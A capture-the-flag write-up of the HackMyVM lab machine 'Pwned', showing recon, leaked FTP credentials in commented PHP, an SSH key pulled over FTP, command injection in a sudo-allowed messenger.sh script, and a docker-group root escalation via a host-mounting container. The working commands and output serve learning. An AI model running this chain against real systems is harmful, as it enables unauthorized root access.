# Pwned

## Executive Summary
| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| Pwned | annlynn | Beginner | HackMyVM |

**Summary:** Pwned is a beginner-level Linux machine from HackMyVM that demonstrates a multi-layered attack chain involving web enumeration, FTP credential disclosure, SSH key extraction, privilege escalation via command injection, and container escape through Docker group membership. The initial foothold is gained by discovering hardcoded FTP credentials in commented PHP source code on a web application. These credentials provide access to an FTP server containing an SSH private key for user "ariana". After gaining SSH access, a vulnerable shell script (`messenger.sh`) with improper input sanitization allows lateral movement to user "selena" via sudo privileges. The final privilege escalation exploits selena's membership in the docker group, utilizing a well-known container breakout technique to mount the host filesystem and gain root access. This machine effectively teaches reconnaissance methodology, credential hunting in web applications, exploiting command injection vulnerabilities, and understanding the security implications of Docker group membership.

---

## Reconnaissance

### Network Scanning

The first step in any penetration test is identifying live hosts on the network. Using a custom PowerShell scanning script, the target virtual machine was located:

```powershell
PS D:\CTF_Tools> .\ScanNetwork-CTF.ps1
[*] Your IP  : 192.168.100.1
[*] Scanning : 192.168.100.0/24
[*] Status   : Pinging hosts...

[+] Virtual Targets Found:
------------------------------------------------------------

IP             MAC               Vendor
--             ---               ------
192.168.100.97 08:00:27:AE:AA:55 VirtualBox
```

The target was identified at IP address **192.168.100.97** with a VirtualBox MAC address, confirming it as the target VM.

### Service Enumeration

A comprehensive Nmap scan was performed to identify all open ports and running services:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ nmap -sC -sV -p- -T4 192.168.100.97
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-09 20:58 WIB
Nmap scan report for 192.168.100.97
Host is up (0.0037s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 fe:cd:90:19:74:91:ae:f5:64:a8:a5:e8:6f:6e:ef:7e (RSA)
|   256 81:32:93:bd:ed:9b:e7:98:af:25:06:79:5f:de:91:5d (ECDSA)
|_  256 dd:72:74:5d:4d:2d:a3:62:3e:81:af:09:51:e0:14:4a (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Pwned....!!
|_http-server-header: Apache/2.4.38 (Debian)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.39 seconds
```

**Key Findings:**
- **Port 21 (FTP):** vsftpd 3.0.3 - A file transfer service that may allow file retrieval
- **Port 22 (SSH):** OpenSSH 7.9p1 Debian - Secure shell access, potential entry point if credentials are found
- **Port 80 (HTTP):** Apache httpd 2.4.38 - Web server hosting the application titled "Pwned....!!"

### FTP Service Investigation

Testing the FTP service for anonymous access revealed it was disabled:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/pwned]
└─$ ftp 192.168.100.97
Connected to 192.168.100.97.
220 (vsFTPd 3.0.3)
Name (192.168.100.97:ouba): anonymous
530 Permission denied.
ftp: Login failed
ftp> bye
221 Goodbye.
```

Anonymous FTP access was denied, indicating credentials would be required. This service was noted for later investigation once credentials were discovered.

### Web Application Analysis

#### Initial Web Page Inspection

Using curl to retrieve the main web page revealed an interesting message from the attacker:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/pwned]
└─$ curl http://192.168.100.97/
 <!DOCTYPE html>
<html>
<head>
<title>Pwned....!!</title>
</head>
<body>

<h1>  vanakam nanba (Hello friend) </h1>
<p></p>

<p>
<pre>



                                                                                                                 dddddddd
  PPPPPPPPPPPPPPPPP                                                                                              d::::::d
  P::::::::::::::::P                                                                                             d::::::d
  P::::::PPPPPP:::::P                                                                                            d::::::d
  PP:::::P     P:::::P                                                                                           d:::::d
    P::::P     P:::::Pwwwwwww           wwwww           wwwwwwwnnnn  nnnnnnnn        eeeeeeeeeeee        ddddddddd:::::d
    P::::P     P:::::P w:::::w         w:::::w         w:::::w n:::nn::::::::nn    ee::::::::::::ee    dd::::::::::::::d
    P::::PPPPPP:::::P   w:::::w       w:::::::w       w:::::w  n::::::::::::::nn  e::::::eeeee:::::ee d::::::::::::::::d
    P:::::::::::::PP     w:::::w     w:::::::::w     w:::::w   nn:::::::::::::::ne::::::e     e:::::ed:::::::ddddd:::::d
    P::::PPPPPPPPP        w:::::w   w:::::w:::::w   w:::::w      n:::::nnnn:::::ne:::::::eeeee::::::ed::::::d    d:::::d
    P::::P                 w:::::w w:::::w w:::::w w:::::w       n::::n    n::::ne:::::::::::::::::e d:::::d     d:::::d
    P::::P                  w:::::w:::::w   w:::::w:::::w        n::::n    n::::ne::::::eeeeeeeeeee  d:::::d     d:::::d
    P::::P                   w:::::::::w     w:::::::::w         n::::n    n::::ne:::::::e           d:::::d     d:::::d
  PP::::::PP                  w:::::::w       w:::::::w          n::::n    n::::ne::::::::e          d::::::ddddd::::::dd
  P::::::::P                   w:::::w         w:::::w           n::::n    n::::n e::::::::eeeeeeee   d:::::::::::::::::d
  P::::::::P                    w:::w           w:::w            n::::n    n::::n  ee:::::::::::::e    d:::::::::ddd::::d
  PPPPPPPPPP                     www             www             nnnnnn    nnnnnn    eeeeeeeeeeeeee     ddddddddd   ddddd





        A last note from Attacker :)

                   I am Annlynn. I am the hacker hacked your server with your employees but they don't know how i used them.
                   Now they worry about this. Before finding me investigate your employees first. (LOL) then find me Boomers XD..!!


            </pre>
 </p>

</body>
</html>





















<!-- I forgot to add this on last note
     You are pretty smart as i thought
     so here i left it for you
     She sings very well. l loved it  -->
```

**Critical Findings:**
- The attacker mentions compromising employees, hinting that user credentials or information may be hidden on the system
- An HTML comment at the bottom states: **"She sings very well. I loved it"** - This cryptic message may be a hint about a female username or a reference to finding something related to a female user

#### Directory Enumeration

Using Gobuster with a comprehensive wordlist to discover hidden directories:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/pwned]
└─$ gobuster dir -u http://192.168.100.97/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.100.97/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/nothing              (Status: 301) [Size: 318] [--> http://192.168.100.97/nothing/]
/server-status        (Status: 403) [Size: 279]
/hidden_text          (Status: 301) [Size: 322] [--> http://192.168.100.97/hidden_text/]
Progress: 220557 / 220557 (100.00%)
===============================================================
Finished
===============================================================
```

Two interesting directories were discovered: **/nothing** and **/hidden_text**

#### Investigating /nothing Directory

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/pwned]
└─$ curl http://192.168.100.97/nothing/                                                                          <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<html>
 <head>
  <title>Index of /nothing</title>
 </head>
 <body>
<h1>Index of /nothing</h1>
  <table>
   <tr><th valign="top"><img src="/icons/blank.gif" alt="[ICO]"></th><th><a href="?C=N;O=D">Name</a></th><th><a href="?C=M;O=A">Last modified</a></th><th><a href="?C=S;O=A">Size</a></th><th><a href="?C=D;O=A">Description</a></th></tr>
   <tr><th colspan="5"><hr></th></tr>
<tr><td valign="top"><img src="/icons/back.gif" alt="[PARENTDIR]"></td><td><a href="/">Parent Directory</a></td><td>&nbsp;</td><td align="right">  - </td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/text.gif" alt="[TXT]"></td><td><a href="nothing.html">nothing.html</a></td><td align="right">2020-07-10 13:01  </td><td align="right">194 </td><td>&nbsp;</td></tr>
   <tr><th colspan="5"><hr></th></tr>
</table>
<address>Apache/2.4.38 (Debian) Server at 192.168.100.97 Port 80</address>
</body></html>

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/pwned]
└─$ curl http://192.168.100.97/nothing/nothing.html
 <!DOCTYPE html>
<html>
<head>
<title>Nothing</title>
</head>
<body>

<h1>i said nothing bro </h1>
<p></p>

<!--I said nothing here. you are wasting your time i don't lie-->



</body>
</html>
```

As indicated by the HTML comment, this directory is a **rabbit hole** with no useful information - a common distraction technique in CTF challenges.

#### Investigating /hidden_text Directory

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/pwned]
└─$ curl http://192.168.100.97/hidden_text/
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<html>
 <head>
  <title>Index of /hidden_text</title>
 </head>
 <body>
<h1>Index of /hidden_text</h1>
  <table>
   <tr><th valign="top"><img src="/icons/blank.gif" alt="[ICO]"></th><th><a href="?C=N;O=D">Name</a></th><th><a href="?C=M;O=A">Last modified</a></th><th><a href="?C=S;O=A">Size</a></th><th><a href="?C=D;O=A">Description</a></th></tr>
   <tr><th colspan="5"><hr></th></tr>
<tr><td valign="top"><img src="/icons/back.gif" alt="[PARENTDIR]"></td><td><a href="/">Parent Directory</a></td><td>&nbsp;</td><td align="right">  - </td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/unknown.gif" alt="[   ]"></td><td><a href="secret.dic">secret.dic</a></td><td align="right">2020-07-09 18:37  </td><td align="right">211 </td><td>&nbsp;</td></tr>
   <tr><th colspan="5"><hr></th></tr>
</table>
<address>Apache/2.4.38 (Debian) Server at 192.168.100.97 Port 80</address>
</body></html>

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/pwned]
└─$ curl http://192.168.100.97/hidden_text/secret.dic
/hacked
/vanakam_nanba
/hackerman.gif
/facebook
/whatsapp
/instagram
/pwned
/pwned.com
/pubg
/cod
/fortnite
/youtube
/kali.org
/hacked.vuln
/users.vuln
/passwd.vuln
/pwned.vuln
/backup.vuln
/.ssh
/root
/home
```

**Excellent discovery!** A custom wordlist named `secret.dic` was found containing potential directory paths. The `.vuln` extensions suggest vulnerable endpoints that may contain sensitive information.

#### Custom Wordlist Fuzzing

Downloading the wordlist and using it with ffuf to discover hidden endpoints:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/pwned]
└─$ curl -O http://192.168.100.97/hidden_text/secret.dic
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   211  100   211    0     0 12447      0 --:--:-- --:--:-- --:--:-- 13187

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/pwned]
└─$ ffuf -u http://192.168.100.97/FUZZ -w secret.dic

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.100.97/FUZZ
 :: Wordlist         : FUZZ: /tmp/pwned/secret.dic
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

                        [Status: 200, Size: 3065, Words: 1523, Lines: 76, Duration: 17ms]
/pwned.vuln             [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 39ms]
:: Progress: [22/22] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::
```

The fuzzing revealed a valid endpoint: **/pwned.vuln**

---

## Initial Access

### Credential Discovery

Investigating the `/pwned.vuln` endpoint revealed a login page with a critical vulnerability:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/pwned]
└─$ curl http://192.168.100.97/pwned.vuln/
<!DOCTYPE html>
<html>
<head>
        <title>login</title>
</head>
<body>
                <div id="main">
                        <h1> vanakam nanba. I hacked your login page too with advanced hacking method</h1>
                        <form method="POST">
                        Username <input type="text" name="username" class="text" autocomplete="off" required>
                        Password <input type="password" name="password" class="text" required>
                        <input type="submit" name="submit" id="sub">
                        </form>
                        </div>
</body>
</html>




<?php
//      if (isset($_POST['submit'])) {
//              $un=$_POST['username'];
//              $pw=$_POST['password'];
//
//      if ($un=='ftpuser' && $pw=='B0[REDACTED]') {
//              echo "welcome"
//              exit();
// }
// else
//      echo "Invalid creds"
// }
?>
```

**Critical Security Flaw:** The PHP source code containing authentication credentials was left in HTML comments! This represents a severe security misconfiguration.

**Discovered Credentials:**
- **Username:** ftpuser
- **Password:** B0[REDACTED]

### FTP Access

Using the discovered credentials to access the FTP service:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/pwned]
└─$ ftp 192.168.100.97
Connected to 192.168.100.97.
220 (vsFTPd 3.0.3)
Name (192.168.100.97:ouba): ftpuser
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering Extended Passive Mode (|||29880|)
150 Here comes the directory listing.
drwxrwxrwx    3 0        0            4096 Jul 09  2020 .
drwxr-xr-x    5 0        0            4096 Jul 10  2020 ..
drwxr-xr-x    2 0        0            4096 Jul 10  2020 share
226 Directory send OK.
ftp> cd share
250 Directory successfully changed.
ftp> ls -la
229 Entering Extended Passive Mode (|||40842|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Jul 10  2020 .
drwxrwxrwx    3 0        0            4096 Jul 09  2020 ..
-rw-r--r--    1 0        0            2602 Jul 09  2020 id_rsa
-rw-r--r--    1 0        0              75 Jul 09  2020 note.txt
226 Directory send OK.
ftp> mget *
mget id_rsa [anpqy?]? y
229 Entering Extended Passive Mode (|||18068|)
150 Opening BINARY mode data connection for id_rsa (2602 bytes).
100% |************************************************************************************|  2602        1.27 MiB/s    00:00 ETA
226 Transfer complete.
2602 bytes received in 00:00 (470.73 KiB/s)
mget note.txt [anpqy?]? y
229 Entering Extended Passive Mode (|||33492|)
150 Opening BINARY mode data connection for note.txt (75 bytes).
100% |************************************************************************************|    75      882.43 KiB/s    00:00 ETA
226 Transfer complete.
75 bytes received in 00:00 (46.32 KiB/s)
ftp> bye
221 Goodbye.
```

**Critical Files Acquired:**
1. **id_rsa** - An SSH private key (2602 bytes)
2. **note.txt** - A text file containing a clue

### Analyzing Downloaded Files

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/pwned]
└─$ cat note.txt

Wow you are here

ariana won't happy about this note

sorry ariana :(

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/pwned]
└─$ cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
..............................[REDACTED]..............................
GxY4+eGHY4WJUdAAAADHJvb3RAQW5ubHlubgECAwQFBg==
-----END OPENSSH PRIVATE KEY-----
```

**Analysis:**
- The note mentions **"ariana"** - likely a username on the system (correlating with the earlier hint "She sings very well", possibly referring to Ariana Grande)
- The `id_rsa` file is an OpenSSH private key that can be used for authentication

### SSH Access as Ariana

Setting proper permissions on the private key and establishing SSH connection:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/pwned]
└─$ chmod 600 id_rsa

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/pwned]
└─$ ssh -i id_rsa ariana@192.168.100.97
...
Linux pwned 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64
...
ariana@pwned:~$ id
uid=1000(ariana) gid=1000(ariana) groups=1000(ariana),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth)
ariana@pwned:~$ ls -la
total 40
drwxrwx--- 4 ariana ariana 4096 Jul 10  2020 .
drwxr-xr-x 5 root   root   4096 Jul 10  2020 ..
-rw-r--r-- 1 ariana ariana  142 Jul 10  2020 ariana-personal.diary
-rw------- 1 ariana ariana  412 Feb  9 20:08 .bash_history
-rw-r--r-- 1 ariana ariana  220 Jul  4  2020 .bash_logout
-rw-r--r-- 1 ariana ariana 3526 Jul  4  2020 .bashrc
drwxr-xr-x 3 ariana ariana 4096 Jul  6  2020 .local
-rw-r--r-- 1 ariana ariana  807 Jul  4  2020 .profile
drwx------ 2 ariana ariana 4096 Jul  9  2020 .ssh
-rw-r--r-- 1 ariana ariana  143 Jul 10  2020 user1.txt
```

**Success!** Initial access achieved as user `ariana`. The user flag is visible in the home directory.

---

## Privilege Escalation

### User Enumeration

Identifying all users with shell access on the system:

```bash
ariana@pwned:~$ cat /etc/passwd | grep /bin/bash
root:x:0:0:root:/root:/bin/bash
ariana:x:1000:1000:Ariana,,,:/home/ariana:/bin/bash
selena:x:1001:1001:,,,:/home/selena:/bin/bash
ftpuser:x:1002:1002::/home/ftpuser:/bin/bash
```

**Finding:** There are four users with bash shells: root, ariana (current user), selena, and ftpuser. Privilege escalation to **selena** or **root** is required.

### Lateral Movement: Ariana → Selena

#### Sudo Privilege Analysis

```bash
ariana@pwned:~$ sudo -l
Matching Defaults entries for ariana on pwned:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User ariana may run the following commands on pwned:
    (selena) NOPASSWD: /home/messenger.sh
```

**Critical Finding:** User `ariana` can execute `/home/messenger.sh` as user `selena` without a password.

#### Script Analysis

Examining the messenger.sh script for vulnerabilities:

```bash
ariana@pwned:~$ file /home/messenger.sh
/home/messenger.sh: Bourne-Again shell script, ASCII text executable
ariana@pwned:~$ ls -la /home/messenger.sh
-rwxr-xr-x 1 root root 367 Jul 10  2020 /home/messenger.sh
ariana@pwned:~$ cat /home/messenger.sh
#!/bin/bash

clear
echo "Welcome to linux.messenger "
                echo ""
users=$(cat /etc/passwd | grep home |  cut -d/ -f 3)
                echo ""
echo "$users"
                echo ""
read -p "Enter username to send message : " name
                echo ""
read -p "Enter message for $name :" msg
                echo ""
echo "Sending message to $name "

$msg 2> /dev/null

                echo ""
echo "Message sent to $name :) "
                echo ""
```

**Vulnerability Identified:** The line `$msg 2> /dev/null` executes user input directly without any sanitization. This is a classic **command injection vulnerability**. Any command entered as the "message" will be executed in the context of user `selena`.

#### Exploitation

Leveraging the command injection to spawn a shell as selena:

```bash
ariana@pwned:~$ sudo -u selena /home/messenger.sh
Welcome to linux.messenger


ariana:
selena:
ftpuser:

Enter username to send message : selena

Enter message for selena :/bin/bash

Sending message to selena
id
uid=1001(selena) gid=1001(selena) groups=1001(selena),115(docker)
```

**Success!** By entering `/bin/bash` as the message, a shell was spawned with selena's privileges. Notice the critical detail: selena is a member of the **docker** group (GID 115).

#### Shell Stabilization

Stabilizing the shell for better interaction:

```bash
which python3
/usr/bin/python3
python3 -c 'import pty; pty.spawn("/bin/bash")'
selena@pwned:/home/ariana$ cd
selena@pwned:~$
```

### Privilege Escalation: Selena → Root

#### Docker Group Exploitation

Verifying docker group membership and docker availability:

```bash
selena@pwned:~$ id
uid=1001(selena) gid=1001(selena) groups=1001(selena),115(docker)
selena@pwned:~$ which docker
/usr/bin/docker
```

**Critical Security Misconfiguration:** Users in the `docker` group have effective root access because they can mount the host filesystem inside a container and interact with it as root.

Consulting GTFOBins (https://gtfobins.org/gtfobins/docker/) for the Docker privilege escalation technique:

![](image.png)

The GTFOBins page confirms that Docker can spawn an interactive system shell. The technique involves:
1. Running a Docker container with the `-v /:/mnt` flag to mount the entire host filesystem
2. Using `chroot /mnt` to change root to the host filesystem
3. Executing `/bin/bash` to spawn a root shell on the host

#### Root Shell Execution

```bash
selena@pwned:~$ docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/bash
root@f3ed687d9606:/# id
uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)
root@f3ed687d9606:/# hostname
f3ed687d9606
root@f3ed687d9606:/# whoami
root
root@f3ed687d9606:/# cd
root@f3ed687d9606:~# cat /home/ariana/user1.txt /root/root.txt
congratulations you Pwned ariana

Here is your user flag ↓↓↓↓↓↓↓

fb8[REDACTED]

Try harder.need become root
4d4[REDACTED]
...
```

**Root access achieved!** The Docker container escape technique successfully provided root-level access to the host filesystem, allowing retrieval of both the user and root flags.

**Flags Captured:**
- **User Flag:** fb8[REDACTED]
- **Root Flag:** 4d4[REDACTED]

---

## Attack Chain Summary

1. **Reconnaissance:** Conducted network scan identifying target at 192.168.100.97 with FTP (21), SSH (22), and HTTP (80) services. Performed comprehensive Nmap service enumeration revealing vsftpd 3.0.3, OpenSSH 7.9p1, and Apache 2.4.38.

2. **Vulnerability Discovery:** Enumerated web directories using Gobuster, discovering `/hidden_text` containing a custom wordlist (`secret.dic`). Fuzzed endpoints using ffuf with the custom wordlist, revealing `/pwned.vuln` login page with hardcoded FTP credentials exposed in commented PHP source code (ftpuser:B0[REDACTED]).

3. **Exploitation:** Authenticated to FTP service using discovered credentials, downloaded SSH private key (`id_rsa`) and note mentioning user "ariana". Established SSH connection as ariana using the private key, achieving initial foothold.

4. **Internal Enumeration:** Identified sudo privileges allowing ariana to execute `/home/messenger.sh` as user selena without password. Analyzed script revealing command injection vulnerability in unsanitized user input execution (`$msg 2> /dev/null`).

5. **Privilege Escalation:** Exploited command injection in messenger.sh by submitting `/bin/bash` as message input, gaining shell as selena. Identified selena's membership in docker group (GID 115). Leveraged Docker container escape technique (`docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/bash`) to mount host filesystem and spawn root shell, achieving complete system compromise.

